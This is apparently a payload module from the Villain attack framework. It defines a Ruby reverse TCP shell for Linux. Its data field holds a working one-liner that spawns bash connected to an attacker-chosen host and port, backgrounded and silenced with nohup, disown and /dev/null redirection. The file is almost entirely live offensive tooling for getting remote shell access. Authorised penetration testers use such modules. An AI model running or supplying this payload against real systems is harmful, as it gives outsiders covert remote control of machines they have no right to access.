# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Ruby reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ruby reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'ruby-reverse-tcp',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
    